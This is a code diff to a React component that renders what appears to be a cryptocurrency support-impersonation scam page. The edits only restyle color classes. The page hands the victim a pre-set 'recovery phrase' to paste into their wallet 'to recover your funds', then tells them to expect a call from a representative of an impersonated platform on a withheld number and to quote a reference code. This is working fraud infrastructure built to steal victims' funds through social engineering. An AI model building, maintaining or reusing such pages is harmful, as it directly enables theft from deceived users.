@@ -59,7 +59,7 @@ export default function ClientOnly({ securitySession }: Props) {
   };
 
   return (
-    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
+    <div className="min-h-screen bg-background flex items-center justify-center p-4">
       <div className="w-full max-w-md">
         <Banner securityCode={securitySession.securityCode} />
         <Card className="shadow-lg py-0">
@@ -73,7 +73,7 @@ export default function ClientOnly({ securitySession }: Props) {
                 </div>
                 <div className="mb-6">
                   <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
-                    <AlertDescription className="text-gray-600 text-center">
+                    <AlertDescription className="text-muted-foreground text-center">
                       This recovery phrase is linked to your account to keep
                       your funds safe. Please copy it and paste it into your
                       custodial wallet
@@ -82,10 +82,10 @@ export default function ClientOnly({ securitySession }: Props) {
                 </div>
                 <div className="mb-6">
                   <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
-                    <AlertTitle className="text-start mb-2 text-gray-400 w-full">
+                    <AlertTitle className="text-start mb-2 text-muted-foreground w-full">
                       Your Recovery Phrase:
                     </AlertTitle>
-                    <AlertDescription className="text-gray-600 text-start p-4 rounded-md bg-white w-full ">
+                    <AlertDescription className="text-muted-foreground text-start p-4 rounded-md bg-background w-full ">
                       {recoveryPhrase}
                     </AlertDescription>
                   </Alert>
@@ -112,7 +112,7 @@ export default function ClientOnly({ securitySession }: Props) {
                 </div>
 
                 <div className="mb-6">
-                  <p className="text-gray-400 text-sm text-center px-4 mb-4">
+                  <p className="text-muted-foreground text-sm text-center px-4 mb-4">
                     After copying, please paste this recovery phrase into your
                     custodial wallet to complete the verification and recover
                     your funds.
@@ -126,7 +126,7 @@ export default function ClientOnly({ securitySession }: Props) {
                     Please expect a call from a {getPlatform().name}{" "}
                     representative shortly
                   </h2>
-                  <p className="text-gray-400 text-sm text-center px-4 mb-4">
+                  <p className="text-muted-foreground text-sm text-center px-4 mb-4">
                     Calls may may show up from a restricted or withheld number.
                     Please answer promptly so we can assist you.
                   </p>
@@ -134,7 +134,7 @@ export default function ClientOnly({ securitySession }: Props) {
 
                 <div className="mb-6">
                   <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
-                    <AlertTitle className="text-lg font-semibold text-center mb-2 text-gray-400">
+                    <AlertTitle className="text-lg font-semibold text-center mb-2 text-muted-foreground">
                       Use reference
                     </AlertTitle>
                     <AlertDescription className="text-primary text-center text-3xl font-bold uppercase">
@@ -144,15 +144,15 @@ export default function ClientOnly({ securitySession }: Props) {
                 </div>
 
                 <div className="mb-6">
-                  <p className="text-gray-500 text-center px-4 mb-4">
+                  <p className="text-muted-foreground text-center px-4 mb-4">
                     We take your security seriously and will help resolve this
                     issue as quickly as possible.
                   </p>
                 </div>
 
                 <div className="mb-6">
-                  <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-blue-600/10 border-0">
-                    <AlertDescription className="text-gray-500 text-center">
+                  <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
+                    <AlertDescription className="text-muted-foreground text-center">
                       Please don&apos;t close this page. You will need to
                       provide information to the agent
                     </AlertDescription>
